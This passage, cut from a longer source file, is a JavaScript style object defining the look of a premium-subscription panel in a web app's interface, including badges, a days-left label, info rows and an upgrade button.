    padding: 16,
    marginTop: 8,
  },
  premiumBadge: {
    background: 'linear-gradient(90deg, #06b6d4, #10b981)',
    color: '#002',
    padding: '4px 8px',
    borderRadius: 6,
    fontSize: 12,
    fontWeight: 700,
  },
  daysLeft: {
    fontSize: 12,
    color: '#f59e0b',
    fontWeight: 700,
  },
  premiumInfo: {
    marginTop: 8,
  },
  infoRow: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    padding: '4px 0',
    fontSize: 12,
    color: '#9fb0bb',
  },
  allowed: {
    color: '#10b981',
    fontWeight: 700,
  },
  premiumInactive: {
    background: 'rgba(255,255,255,0.03)',
    border: '1px solid rgba(255,255,255,0.1)',
    borderRadius: 10,
    padding: 16,
    marginTop: 8,
    textAlign: 'center',
  },
  premiumBadgeInactive: {
    background: 'rgba(255,255,255,0.1)',
    color: '#9fb0bb',
    padding: '4px 8px',
    borderRadius: 6,
    fontSize: 12,
    fontWeight: 700,
    display: 'inline-block',
    marginBottom: 8,
  },
  premiumMessage: {
    fontSize: 12,
    color: '#9fb0bb',
    marginBottom: 12,
  },
  upgradeBtn: {
    background: 'linear-gradient(90deg, #f59e0b, #d97706)',
    color: '#002',
    border: 'none',
    padding: '8px 16px',
    borderRadius: 6,
    fontWeight: 700,
    cursor: 'pointer',
    width: '100%',
  },
};